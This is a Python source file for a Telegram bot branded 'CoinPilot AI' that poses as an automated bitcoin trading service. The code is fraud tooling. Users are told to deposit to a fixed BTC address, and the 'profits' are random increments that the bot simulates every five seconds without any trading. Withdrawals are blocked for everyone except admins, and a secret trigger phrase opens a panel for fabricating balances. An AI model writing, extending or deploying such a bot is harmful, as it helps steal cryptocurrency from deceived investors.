import os
import random
import requests
import asyncio
import json
import nest_asyncio
from aiohttp import web

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

nest_asyncio.apply()

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is not set")

SECRET_INJECT_TRIGGER = "NewMexicoMouse"
DATA_FILE = "data.json"

# Load and save persistent data with safe defaults
def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            loaded = json.load(f)
            if "admins" not in loaded or "users" not in loaded:
                raise ValueError("Missing required keys")
            return loaded
    except:
        return {"admins": [], "users": {}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

data = load_data()

# Add your Telegram ID here initially as admin if not present
YOUR_TELEGRAM_ID = 6064485557
if YOUR_TELEGRAM_ID not in data["admins"]:
    data["admins"].append(YOUR_TELEGRAM_ID)
    save_data(data)

def get_balance(user_id):
    return data["users"].get(str(user_id), {}).get("balance", 0.0)

def set_balance(user_id, amount):
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {}
    data["users"][uid]["balance"] = amount
    save_data(data)

def get_state(user_id):
    return data["users"].get(str(user_id), {}).get("state", {"running": False, "strategy": None})

def set_state(user_id, state):
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {}
    data["users"][uid]["state"] = state
    save_data(data)

# UTF-8 safe text wrapper for buttons
def safe_text(s):
    if not isinstance(s, str):
        s = str(s)
    return s.encode("utf-8", errors="ignore").decode("utf-8")

def get_main_menu():
    keyboard = [
        [InlineKeyboardButton(safe_text("💰 Balance"), callback_data='balance')],
        [
            InlineKeyboardButton(safe_text("📤 Withdrawal"), callback_data='withdrawal'),
            InlineKeyboardButton(safe_text("📥 Deposit"), callback_data='deposit'),
        ],
        [
            InlineKeyboardButton(safe_text("▶️ Run"), callback_data='run'),
            InlineKeyboardButton(safe_text("⏹ Stop"), callback_data='stop'),
        ],
        [
            InlineKeyboardButton(safe_text("📊 Monitor"), callback_data='monitor'),
            InlineKeyboardButton(safe_text("🧠 Strategy"), callback_data='strategy'),
        ],
        [InlineKeyboardButton(safe_text("🚪 Exit"), callback_data='exit')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_strategy_menu():
    keyboard = [
        [
            InlineKeyboardButton(safe_text("📈 Momentum"), callback_data='strategy_momentum'),
            InlineKeyboardButton(safe_text("📉 Mean Reversion"), callback_data='strategy_mean'),
            InlineKeyboardButton(safe_text("⚙️ Grid Trading"), callback_data='strategy_grid'),
        ],
        [InlineKeyboardButton(safe_text("🔙 Back"), callback_data='back_to_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

pending_inject = {}
pending_withdrawal = {}
user_states = {}
last_price = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    set_balance(user_id, get_balance(user_id))  # ensure user data exists
    set_state(user_id, get_state(user_id))

    try:
        with open("header.jpg", "rb") as img:
            await update.message.reply_photo(
                photo=InputFile(img),
                caption="Welcome to CoinPilot AI!"
            )
    except:
        await update.message.reply_text("Welcome to CoinPilot AI!")

    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    user_id = query.from_user.id

    balance = get_balance(user_id)
    state = get_state(user_id)
    admins = data.get("admins", [])

    if action == "exit":
        await query.edit_message_text("🚪 Session ended. Goodbye!")
        return

    elif action == "deposit":
        await query.edit_message_text(
            "💼 This is your deposit address (Minimum deposit: 0.001 BTC)",
            reply_markup=get_main_menu()
        )
        await query.message.reply_text("`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`", parse_mode="Markdown")
        return

    elif action == "balance":
        await query.edit_message_text(f"💰 Balance: {balance:.8f} BTC", reply_markup=get_main_menu())
        return

    elif action == "withdrawal":
        if user_id not in admins:
            await query.edit_message_text("❌ Transaction failed: You are not authorized to withdraw.", reply_markup=get_main_menu())
            return
        if balance <= 0:
            await query.edit_message_text("❌ You can’t withdraw with a 0.00000000 BTC balance.", reply_markup=get_main_menu())
            return
        pending_withdrawal[user_id] = {'step': 1}
        await query.edit_message_text("💸 Please enter the Bitcoin address you want to withdraw to:")
        await context.bot.send_message(YOUR_TELEGRAM_ID, f"⚠️ User {user_id} initiated a withdrawal with balance {balance:.8f} BTC")
        return

    elif action == "run":
        if balance <= 0:
            await query.edit_message_text("⚠️ You have no balance. Please deposit BTC to start trading.", reply_markup=get_main_menu())
        else:
            state["running"] = True
            set_state(user_id, state)
            await query.edit_message_text(f"✅ Bot started. Using {balance:.8f} BTC to auto trade...", reply_markup=get_main_menu())
        return

    elif action == "stop":
        state["running"] = False
        set_state(user_id, state)
        await query.edit_message_text("⏹ Bot has been stopped.", reply_markup=get_main_menu())
        return

    elif action == "monitor":
        try:
            btc_price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()["bitcoin"]["usd"]
        except:
            btc_price = "Unknown"

        is_running = "✅ Running" if state["running"] else "⛔️ Not Running"
        strategy = state["strategy"] if state["strategy"] else "None Selected"
        msg = (
            f"📊 *Trading Monitor*\n"
            f"----------------------------\n"
            f"🧠 Strategy: {strategy}\n"
            f"🚦 Bot Status: {is_running}\n"
            f"💰 Balance: {balance:.8f} BTC\n"
            f"📈 BTC Price: ${btc_price}\n"
            f"📈 Profit: $0.00"
        )
        await query.edit_message_text(msg, reply_markup=get_main_menu(), parse_mode="Markdown")
        return

    elif action == "strategy":
        await query.edit_message_text("💡 Choose a trading strategy:", reply_markup=get_strategy_menu())
        return

    elif action.startswith("strategy_"):
        strategies = {
            "momentum": "Momentum",
            "mean": "Mean Reversion",
            "grid": "Grid Trading"
        }
        sname = action.split("_")[1]
        state["strategy"] = strategies.get(sname)
        set_state(user_id, state)
        await query.edit_message_text(f"Selected strategy: {strategies.get(sname)}", reply_markup=get_strategy_menu())
        return

    elif action == "back_to_main":
        await query.edit_message_text("Choose an option:", reply_markup=get_main_menu())
        return

    elif action == 'withdraw_confirm':
        wd = pending_withdrawal.get(user_id)
        if not wd or wd.get('step') != 2:
            await query.answer("No withdrawal in progress.", show_alert=True)
            return
        fee = balance * 0.05
        net = balance - fee
        address = wd['address']
        set_balance(user_id, 0.0)
        pending_withdrawal.pop(user_id)
        await query.edit_message_text(f"✅ Withdrawal sent: {net:.8f} BTC to `{address}`\nFee: {fee:.8f} BTC", parse_mode="Markdown", reply_markup=get_main_menu())
        return

    elif action == 'withdraw_cancel':
        pending_withdrawal.pop(user_id, None)
        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_main_menu())
        return

    elif action == "admin_inject_self" and user_id in data.get("admins", []):
        pending_inject[user_id] = True
        await query.edit_message_text("💰 How much BTC to inject into your own balance?")
        return

    elif action == "admin_edit_user" and user_id in data.get("admins", []):
        user_states[user_id] = {"awaiting_edit_target": True}
        await query.edit_message_text("🔍 Send the target Telegram ID to edit:")
        return

    elif action == "admin_view_all" and user_id in data.get("admins", []):
        msg = "📄 All Balances:\n\n"
        for uid, info in data["users"].items():
            msg += f"👤 {uid}: {info.get('balance', 0.0):.8f} BTC\n"
        await query.edit_message_text(msg)
        return

async def handle_secret_inject(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    admins = data.get("admins", [])

    # Admin Panel Access
    if text == SECRET_INJECT_TRIGGER and user_id in admins:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(safe_text("💰 Inject to self"), callback_data="admin_inject_self")],
            [InlineKeyboardButton(safe_text("📝 Edit user balance"), callback_data="admin_edit_user")],
            [InlineKeyboardButton(safe_text("📄 View all balances"), callback_data="admin_view_all")],
            [InlineKeyboardButton(safe_text("➕ Add admin"), callback_data="admin_add_admin")],
            [InlineKeyboardButton(safe_text("➖ Remove admin"), callback_data="admin_remove_admin")]
        ])
        await update.message.reply_text("🛠️ Admin Panel:", reply_markup=keyboard)
        return

    # Admin: Add or remove admin (after secret phrase)
    if user_states.get(user_id, {}).get("awaiting_admin_add"):
        try:
            new_admin = int(text)
            if new_admin not in data["admins"]:
                data["admins"].append(new_admin)
                save_data(data)
            user_states[user_id] = {}
            await update.message.reply_text(f"✅ Added admin {new_admin}")
        except:
            await update.message.reply_text("❌ Invalid Telegram ID.")
        return

    if user_states.get(user_id, {}).get("awaiting_admin_remove"):
        try:
            rem_admin = int(text)
            if rem_admin in data["admins"]:
                data["admins"].remove(rem_admin)
                save_data(data)
            user_states[user_id] = {}
            await update.message.reply_text(f"✅ Removed admin {rem_admin}")
        except:
            await update.message.reply_text("❌ Invalid Telegram ID.")
        return

    # Admin: edit user balances
    if user_states.get(user_id, {}).get("awaiting_edit_target"):
        try:
            tid = int(text)
            user_states[user_id] = {"editing_user": tid}
            await update.message.reply_text("💸 Enter the new BTC balance for this user:")
        except:
            await update.message.reply_text("❌ Invalid Telegram ID.")
        return

    if "editing_user" in user_states.get(user_id, {}):
        try:
            amount = float(text)
            target = user_states[user_id]["editing_user"]
            set_balance(target, amount)
            user_states[user_id] = {}
            await update.message.reply_text(f"✅ Set {target}'s balance to {amount:.8f} BTC.")
        except:
            await update.message.reply_text("❌ Invalid amount.")
        return

    # Admin: inject balance to self
    if user_id in pending_inject and pending_inject[user_id]:
        try:
            amount = float(text)
            new_balance = get_balance(user_id) + amount
            set_balance(user_id, new_balance)
            pending_inject[user_id] = False
            await update.message.reply_text(f"✅ Injected {amount:.8f} BTC.")
        except:
            await update.message.reply_text("❌ Invalid number.")
        return

    # Admin: handle add/remove admin triggers
    if text == "➕ Add admin" and user_id in admins:
        user_states[user_id] = {"awaiting_admin_add": True}
        await update.message.reply_text("🆔 Send the Telegram ID of the new admin:")
        return

    if text == "➖ Remove admin" and user_id in admins:
        user_states[user_id] = {"awaiting_admin_remove": True}
        await update.message.reply_text("🆔 Send the Telegram ID of the admin to remove:")
        return

    # Handle user withdrawal address input
    if user_id in pending_withdrawal and pending_withdrawal[user_id].get("step") == 1:
        address = text
        balance = get_balance(user_id)
        fee = balance * 0.05
        net = balance - fee
        pending_withdrawal[user_id] = {'step': 2, 'address': address}
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(safe_text("✅ Confirm"), callback_data='withdraw_confirm'),
             InlineKeyboardButton(safe_text("❌ Cancel"), callback_data='withdraw_cancel')]
        ])
        await update.message.reply_text(
            f"⚠️ Withdrawal Summary:\n\nAddress: `{address}`\nBalance: {balance:.8f} BTC\nFee: {fee:.8f} BTC\nNet: {net:.8f} BTC",
            reply_markup=keyboard, parse_mode="Markdown")
        return

async def profit_simulator_tick(context: ContextTypes.DEFAULT_TYPE):
    # Simulate profit increment on running users
    for uid in list(data["users"].keys()):
        try:
            uid_int = int(uid)
        except:
            continue
        state = get_state(uid_int)
        if state.get("running"):
            profit = random.uniform(0.00001, 0.00005)
            set_balance(uid_int, get_balance(uid_int) + profit)

async def btc_price_monitor(context: ContextTypes.DEFAULT_TYPE):
    global last_price
    try:
        price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()["bitcoin"]["usd"]
        if last_price:
            diff = (price - last_price) / last_price
            if abs(diff) >= 0.05:
                await context.bot.send_message(chat_id=YOUR_TELEGRAM_ID,
                    text=f"📉 BTC price moved {diff*100:.2f}%!\nOld: ${last_price:.2f}\nNew: ${price:.2f}")
        last_price = price
    except:
        pass

async def handle(request):
    return web.Response(text="OK")

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", "8000"))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    while True:
        await asyncio.sleep(3600)

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_secret_inject))
    app.job_queue.run_repeating(profit_simulator_tick, interval=5, first=5)
    app.job_queue.run_repeating(btc_price_monitor, interval=60, first=10)
    webserver_task = asyncio.create_task(run_webserver())
    await app.run_polling()
    webserver_task.cancel()
    try:
        await webserver_task
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    asyncio.run(main())
